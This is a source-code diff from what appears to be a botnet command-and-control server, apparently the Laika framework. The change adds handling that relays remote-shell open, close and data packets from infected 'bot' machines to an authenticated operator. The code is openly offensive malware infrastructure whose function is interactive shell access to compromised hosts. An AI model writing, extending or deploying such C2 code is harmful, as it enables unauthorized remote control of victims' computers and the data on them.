@@ -60,19 +60,31 @@ void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
     struct sLaika_cnc *cnc = bInfo->info.cnc;
     uint8_t _res = laikaS_readByte(&peer->sock);
 
-    
+    if (bInfo->shellAuth == NULL)
+        LAIKA_ERROR("LAIKAPKT_SHELL_CLOSE malformed packet!");
+
+    /* forward to SHELL_CLOSE to auth */
+    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_AUTHENTICATED_SHELL_CLOSE);
+
+    /* close shell */
+    ((struct sLaika_authInfo*)(bInfo->shellAuth->uData))->shellBot = NULL;
+    bInfo->shellAuth = NULL;
 }
 
 void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
+    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)uData;
     uint8_t id;
 
-    if (sz <= 1 || sz > LAIKA_SHELL_DATA_MAX_LENGTH)
+    if (bInfo->shellAuth == NULL || sz < 1 || sz > LAIKA_SHELL_DATA_MAX_LENGTH)
         LAIKA_ERROR("LAIKAPKT_SHELL_DATA malformed packet!");
 
-    id = laikaS_readByte(&peer->sock);
-    laikaS_read(&peer->sock, (void*)buf, sz-1);
-    write(STDOUT_FILENO, (void*)buf, sz-1);
+    laikaS_read(&peer->sock, (void*)buf, sz);
+
+    /* forward SHELL_DATA packet to auth */
+    laikaS_startVarPacket(bInfo->shellAuth, LAIKAPKT_AUTHENTICATED_SHELL_DATA);
+    laikaS_write(&bInfo->shellAuth->sock, buf, sz);
+    laikaS_endVarPacket(bInfo->shellAuth);
 }
 
 void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
@@ -147,9 +159,17 @@ struct sLaika_peerPacketInfo laikaC_botPktTbl[LAIKAPKT_MAXNONE] = {
 struct sLaika_peerPacketInfo laikaC_authPktTbl[LAIKAPKT_MAXNONE] = {
     DEFAULT_PKT_TBL,
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ,
-        laikaC_handleAuthenticatedHandshake,
+        laikaC_handleAuthenticatedShellOpen,
         crypto_kx_PUBLICKEYBYTES,
     false),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_CLOSE,
+        laikaC_handleAuthenticatedShellClose,
+        0,
+    false),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_DATA,
+        laikaC_handleAuthenticatedShellData,
+        0,
+    true),
 };
 
 #undef DEFAULT_PKT_TBL
